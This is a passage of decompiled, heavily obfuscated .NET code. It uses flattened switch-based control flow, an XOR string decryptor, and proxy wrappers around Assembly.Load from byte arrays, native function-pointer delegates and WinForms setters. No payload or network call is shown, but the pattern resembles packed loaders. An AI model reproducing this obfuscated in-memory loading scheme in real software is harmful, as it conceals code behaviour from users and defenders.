          case 36:
            num1 = (byte) 14 == ((byte[]) array)[index] ? (int) ⴀ[9] - 32 : 32;
            continue;
          case 37:
            num1 = ((byte[]) array)[index] < (byte) 14 ? 16 : 36;
            continue;
          case 38:
            num1 = (byte) 207 == (array as byte[])[index] ? 35 : (int) ⴀ[20] - (int) ⴀ[30];
            continue;
          case 39:
            ++index;
            num1 = 10;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴜ.ႤႳ);
            num1 = (int) ⴗ[175] - 95;
            continue;
        }
      }
label_4:
      return (string) null;
label_9:
      return (string) null;
label_14:
      return (string) null;
label_19:
      return (string) null;
label_24:
      return (string) null;
label_29:
      return (string) null;
label_34:
      return (string) null;
label_38:
      int num3 = index + 1;
      return (string) null;
    }

    internal static string ႨႤ([In] int obj0, [In] int obj1, [In] string obj2)
    {
      byte[] ⴀ = MyApplication.Ⴀ;
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
label_3:
      int index1 = obj1 ^ 95604589 ^ obj0;
      object ⴈⴅ = Ⴐ.Ⴜ.ႨႥ;
      char[] chArray1 = (char[]) ⴈⴅ;
      int num1 = (int) chArray1[index1 + 1];
      int index2 = (int) chArray1[index1] ^ num1;
      int num2 = (int) ⴀ[70] - 145;
      object obj3;
      int num3;
      Array array1;
      Array array2;
      char ch;
      int num4;
      int num5;
      int length1;
      int length2;
      object obj4;
      int index3;
      while (true)
      {
        switch (num2)
        {
          case 0:
            obj3 = (object) new string((char[]) obj4);
            ((string[]) Ⴐ.Ⴜ.ႨႣ)[index2] = obj3 as string;
            num2 = (int) ⴗ[9] - 101;
            continue;
          case 1:
            char[] chArray2 = (char[]) ⴈⴅ;
            char[] ⴈⴈ = (char[]) Ⴐ.Ⴜ.ႨႨ;
            num3 = index1;
            array1 = (Array) ⴈⴈ;
            array2 = (Array) chArray2;
            goto case 14;
          case 2:
          case 9:
            goto label_3;
          case 3:
            num5 = (int) ((char[]) array2)[num3 + 3] ^ (int) ch;
            num3 += 4;
            num2 = (int) ⴀ[75] - 203;
            continue;
          case 4:
            goto label_16;
          case 6:
            obj4 = (object) new char[length1];
            index3 = 0;
            num2 = 11;
            continue;
          case 7:
            goto label_5;
          case 8:
          case 15:
            length1 = num5 | num4 << 16;
            length2 = ((char[]) array1).Length;
            num2 = 6;
            continue;
          case 10:
            ch = ((char[]) array2)[num3 + 1];
            num4 = (int) ((char[]) array2)[num3 + 2] ^ (int) ch;
            num2 = (int) ⴀ[97] - 41;
            continue;
          case 11:
            num2 = index3 < length1 ? (int) ⴀ[18] - 134 : 0;
            continue;
          case 12:
            ++index3;
            num2 = 11;
            continue;
          case 13:
            (obj4 as char[])[index3] = (char) ((uint) ch ^ (uint) (array2 as char[])[num3 + index3] ^ (uint) ((char[]) array1)[(index3 + num3) % length2]);
            num2 = 12;
            continue;
          case 14:
            num2 = 10;
            continue;
          case 16:
            num2 = (string) (obj3 = (object) ((string[]) Ⴐ.Ⴜ.ႨႣ)[index2]) == null ? (int) ⴀ[84] - 201 : 7;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴜ.ႨႤ);
            num2 = 2;
            continue;
        }
      }
label_5:
      return obj3 as string;
label_16:
      return obj3 as string;
    }

    internal static Delegate ႨႰ([In] IntPtr obj0, [In] System.Type obj1, [In] char obj2, [In] char obj3)
    {
      byte[] ⴀ = MyApplication.Ⴀ;
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
label_3:
      int num1 = 0;
      int num2 = (int) ⴗ[173] - 3;
      ICloneable forFunctionPointer;
      int num3;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 5:
            goto label_3;
          case 1:
            goto label_7;
          case 2:
            int num4 = 168;
            num2 = 843 < num3 / 3 - num4 ? 7 : 1;
            continue;
          case 3:
            num3 = 2529;
            goto case 2;
          case 6:
          case 7:
            forFunctionPointer = (ICloneable) Marshal.GetDelegateForFunctionPointer(obj0, obj1);
            ++num1;
            num2 = 3;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴜ.ႨႰ);
            num2 = (int) ⴀ[13] - 26;
            continue;
        }
      }
label_7:
      return forFunctionPointer as Delegate;
    }

    internal static void ႨႷ(
      [In] Array obj0,
      [In] int obj1,
      [In] Array obj2,
      [In] int obj3,
      [In] int obj4,
      [In] int obj5,
      [In] int obj6)
    {
      byte[] ⴀ = MyApplication.Ⴀ;
      int num1 = 4;
      int num2;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 1:
            Buffer.BlockCopy(obj0, obj1, obj2, obj3, obj4);
            goto case 6;
          case 2:
            goto label_7;
          case 3:
            num1 = 635 > (int) sbyte.MaxValue - 121 * 5 ? (int) ⴀ[36] : 5;
            continue;
          case 5:
            num1 = 0;
            continue;
          case 6:
            ++num2;
            num1 = 3;
            continue;
          case 7:
            goto label_8;
          default:
            num2 = 0;
            num1 = 0;
            continue;
        }
      }
label_7:
      return;
label_8:;
    }

    internal static int ႨႭ([In] ref IntPtr obj0, [In] int obj1, [In] short obj2)
    {
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
      byte[] ⴀ = MyApplication.Ⴀ;
label_3:
      int num1 = 0;
      int num2 = 2;
      int int32;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 6:
            goto label_7;
          case 2:
            int32 = obj0.ToInt32();
            goto case 4;
          case 3:
          case 7:
            goto label_3;
          case 4:
            ++num1;
            int num3 = (int) obj2;
            num2 = (num3 * num3 + (int) obj2) % 2 == 0 ? (int) ⴀ[95] - 103 : (int) ⴗ[200] - 138;
            continue;
          case 5:
            num2 = 2;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴜ.ႨႭ);
            num2 = (int) ⴗ[65] - 131;
            continue;
        }
      }
label_7:
      return int32;
    }

    internal static void ႨႼ([In] IntPtr obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3, [In] char obj4, [In] char obj5)
    {
      byte[] ⴀ = MyApplication.Ⴀ;
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
      int num1 = 4;
      int num2;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_7;
          case 1:
          case 7:
            ++num2;
            num1 = (int) ⴀ[10] - 158;
            continue;
          case 2:
          case 3:
            num1 = (int) ⴗ[135] - 176;
            continue;
          case 5:
            Marshal.Copy(obj0, obj1, obj2, obj3);
            goto case 1;
          case 6:
            int num3 = (int) obj5;
            int num4 = num3 * num3 + (int) obj5;
            jDxmSbcafQKRuIHXbd.Ⴗ[144] = (byte) ((int) jDxmSbcafQKRuIHXbd.Ⴗ[144] & obj2 & 15);
            num1 = num4 % 2 == 0 ? (int) ⴀ[5] - 64 : 2;
            continue;
          default:
            num2 = 0;
            num1 = (int) ⴀ[(int) sbyte.MaxValue] - 219;
            continue;
        }
      }
label_7:;
    }

    internal static int ႥႤ([In] Stream obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3, [In] char obj4, [In] int obj5)
    {
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
label_3:
      int num1 = 0;
      int num2 = 6;
      int num3;
      while (true)
      {
        switch (num2)
        {
          case 0:
            ++num1;
            num2 = 4;
            continue;
          case 1:
          case 5:
            goto label_3;
          case 2:
          case 4:
            int num4 = (int) obj4;
            int num5 = num4 * num4;
            num2 = ((int) obj4 + num5) % 2 != 0 ? (int) ⴗ[125] : (int) ⴗ[167] - (int) ⴗ[213];
            continue;
          case 6:
            num3 = obj0.Read(obj1, obj2, obj3);
            goto case 0;
          case 7:
            goto label_7;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴜ.ႥႤ);
            num2 = (int) ⴗ[13] / 6;
            continue;
        }
      }
label_7:
      return num3;
    }

    internal static Assembly ႥႨ(
      [In] byte[] obj0,
      [In] byte[] obj1,
      [In] Evidence obj2,
      [In] int obj3,
      [In] char obj4)
    {
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
      byte[] ⴀ = MyApplication.Ⴀ;
label_3:
      int num1 = 0;
      int num2 = (int) ⴗ[8];
      object obj;
      int num3;
      while (true)
      {
        switch (num2)
        {
          case 0:
            goto label_7;
          case 1:
            obj = (object) Assembly.Load(obj0, obj1, obj2);
            ++num1;
            num2 = 4;
            continue;
          case 2:
          case 6:
            goto label_3;
          case 4:
            int num4 = (int) obj4;
            num3 = num4 * num4;
            goto case 5;
          case 5:
          case 7:
            num3 = (int) obj4 + num3;
            num2 = num3 % 2 != 0 ? 1 : (int) ⴀ[72] - 79;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴜ.ႥႨ);
            num2 = (int) ⴗ[13] / 5;
            continue;
        }
      }
label_7:
      return obj as Assembly;
    }

    internal static byte[] ႥႥ([In] uint obj0, [In] int obj1, [In] short obj2)
    {
label_3:
      int num1 = 0;
      int num2 = 1;
      Array bytes;
      int num3;
      while (true)
      {
        switch (num2)
        {
          case 1:
          case 3:
          case 5:
            bytes = (Array) BitConverter.GetBytes(obj0);
            ++num1;
            num3 = 208;
            num2 = 2;
            continue;
          case 2:
            int num4 = 55;
            num2 = 104 < num3 / 2 - num4 ? 1 : 4;
            continue;
          case 4:
            goto label_6;
          case 7:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴜ.ႥႥ);
            num2 = 7;
            continue;
        }
      }
label_6:
      return (byte[]) bytes;
    }

    internal static void ႥႣ([In] TableLayoutPanel obj0, [In] int obj1, [In] short obj2, [In] int obj3)
    {
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
      byte[] ⴀ = MyApplication.Ⴀ;
      int num1 = 8;
      int num2;
      int num3;
      while (true)
      {
        switch (num1)
        {
          case 0:
            num1 = num3 % 2 != 0 ? 1 : 10;
            continue;
          case 1:
          case 6:
            int num4;
            switch (((int) obj2 ^ obj3) - 82 ^ num2)
            {
              case 0:
                num4 = (int) ⴗ[235];
                break;
              case 1:
                num4 = (int) ⴗ[35];
                break;
              default:
                num4 = 3;
                break;
            }
            num1 = num4;
            continue;
          case 2:
          case 7:
            obj0.RowCount = obj1;
            goto case 5;
          case 3:
            num1 = (int) ⴗ[220] - 178;
            continue;
          case 4:
            goto label_13;
          case 5:
            ++num2;
            int num5 = (int) obj2;
            int num6 = num5 * num5;
            num3 = (int) obj2 + num6;
            num1 = (int) ⴗ[229] - 69;
            continue;
          case 9:
            obj0.ColumnCount = obj1;
            num1 = (int) ⴀ[119] - 4;
            continue;
          case 10:
            goto label_14;
          default:
            num2 = 0;
            num1 = 1;
            continue;
        }
      }
label_13:
      return;
label_14:;
    }

    internal static int ႥႠ(
      [In] TableLayoutColumnStyleCollection obj0,
      [In] ColumnStyle obj1,
      [In] int obj2,
      [In] char obj3)
    {
      byte[] ⴀ = MyApplication.Ⴀ;
label_3:
      int num1 = 0;
      int num2 = (int) ⴀ[55] - 150;
      int num3;
      int num4;
      while (true)
      {
        switch (num2)
        {
          case 0:
            goto label_3;
          case 2:
          case 6:
            num3 = obj0.Add(obj1);
            ++num1;
            num2 = (int) ⴀ[36];
            continue;
          case 3:
            goto label_7;
          case 5:
            int num5 = 151;
            num2 = 482 < num4 / 2 - num5 ? 6 : 3;
            continue;
          case 7:
            num4 = 964;
            goto case 5;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴜ.ႥႠ);
            num2 = 0;
            continue;
        }
      }
label_7:
      return num3;
    }

    internal static void ႥႳ([In] TableLayoutPanel obj0, [In] Control obj1, [In] int obj2, [In] char obj3, [In] int obj4)
    {
      byte[] ⴀ = MyApplication.Ⴀ;
      int num1 = 0;
      int num2;
      while (true)
      {
        switch (num1)
        {
          case 1:
            int num3 = 2432;
            int num4 = 197;
            int num5 = num3;
            MyApplication.Ⴀ[14] = jDxmSbcafQKRuIHXbd.Ⴗ[129];
            num1 = 608 < num5 / 4 - num4 ? (int) ⴀ[144] - 137 : 2;
            continue;
          case 2:
            goto label_7;
          case 3:
            ++num2;
            goto case 5;
          case 4:
            obj0.SetRowSpan(obj1, obj2);
            goto case 3;
          case 5:
            num1 = 1;
            continue;
          case 6:
            goto label_8;
          default:
            num2 = 0;
            num1 = 4;
            continue;
        }
      }
label_7:
      return;
label_8:;
    }

    internal static void ႥႰ([In] PictureBox obj0, [In] int obj1, [In] char obj2, [In] char obj3)
    {
      byte[] ⴀ = MyApplication.Ⴀ;
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
      int num1 = 5;
      int num2;
      int num3;
      int num4;
      while (true)
      {
        switch (num1)
        {
          case 0:
            num4 = 14;
            goto case 1;
          case 1:
            num1 = 109 < num3 / 3 - num4 ? 6 : (int) ⴗ[8] * 3;
            continue;
          case 2:
            num1 = (int) ⴀ[160] - 182;
            continue;
          case 3:
            goto label_7;
          case 4:
            goto label_8;
          case 6:
            obj0.TabIndex = obj1;
            ++num2;
            num3 = 327;
            goto case 2;
          default:
            num2 = 0;
            num1 = 6;
            continue;
        }
      }
label_7:
      return;
label_8:;
    }

    internal static void ႥႷ([In] Control obj0, [In] Padding obj1, [In] char obj2, [In] int obj3)
    {
      byte[] ⴀ = MyApplication.Ⴀ;
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
      int num1 = 2;
      int num2;
      int num3;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_6;
          case 1:
            ++num2;
            num3 = 1119;
            num1 = (int) ⴀ[89] - 210;
            continue;
          case 3:
          case 4:
          case 6:
            obj0.Margin = obj1;
            goto case 1;
          case 5:
            int num4 = 365;
            num1 = 373 < num3 / 3 - num4 ? 4 : (int) ⴗ[192] - 45;
            continue;
          default:
            num2 = 0;
            num1 = 4;
            continue;
        }
      }
label_6:;
    }

    internal static void ႥႭ([In] Label obj0, [In] ContentAlignment obj1, [In] int obj2, [In] char obj3)
    {
      int num1 = 3;
      int num2;
      int num3;
      while (true)
      {
        switch (num1)
        {
          case 0:
            obj0.TextAlign = obj1;
            goto case 4;
          case 2:
            num1 = 6;
            continue;
          case 4:
            ++num2;
            int num4 = (int) obj3;
            num3 = num4 * num4;
            goto case 2;
          case 5:
            goto label_7;
          case 6:
            num3 = (int) obj3 + num3;
            num1 = num3 % 2 != 0 ? 0 : 5;
            continue;
          default:
            num2 = 0;
            num1 = 0;
            continue;
        }
      }
label_7:;
    }

    internal static bool ႥႼ([In] Hashtable obj0, [In] object obj1, [In] int obj2, [In] short obj3)
    {
      byte[] ⴀ = MyApplication.Ⴀ;
label_3:
      int num1 = 0;
      int num2 = 0;
      bool flag;
      int num3;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 6:
            flag = obj0.ContainsKey(obj1);
            ++num1;
            num2 = 3;
            continue;
          case 1:
            int num4 = 103;
            num2 = 512 < num3 / 2 - num4 ? 0 : 7;
            continue;
          case 2:
          case 7:
            goto label_7;
          case 3:
            num3 = 1024;
            goto case 1;
          case 4:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴜ.ႥႼ);
            num2 = (int) ⴀ[155] - 225;
            continue;
        }
      }
label_7:
      return flag;
    }

    internal static Exception ႣႤ([In] Exception obj0, [In] char obj1, [In] char obj2)
    {
      byte[] ⴀ = MyApplication.Ⴀ;
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
label_3:
      int num1 = 0;
      int num2 = 2;
      ISerializable innerException;
      int num3;
      while (true)
      {
        switch (num2)
        {
          case 0:
            ++num1;
            goto case 5;
          case 1:
          case 3:
            int num4 = 161;
            int num5 = num3 / 2;
            int num6 = num4;
            jDxmSbcafQKRuIHXbd.Ⴗ[284] = (byte) ((int) jDxmSbcafQKRuIHXbd.Ⴗ[284] - (int) jDxmSbcafQKRuIHXbd.Ⴗ[122] & 45);
            num2 = 419 < num5 - num6 ? (int) ⴗ[35] : 4;
            continue;
          case 2:
            innerException = (ISerializable) obj0.InnerException;
            goto case 0;
          case 4:
            goto label_8;
          case 5:
            num3 = 838;
            num2 = 3;
            continue;
          case 7:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴜ.ႣႤ);
            num2 = (int) ⴀ[36];
            continue;
        }
      }
label_8:
      return (Exception) innerException;
    }

    [StructLayout(LayoutKind.Explicit, Size = 426, Pack = 1)]
    private struct ႨႠ
    {
    }
  }
}
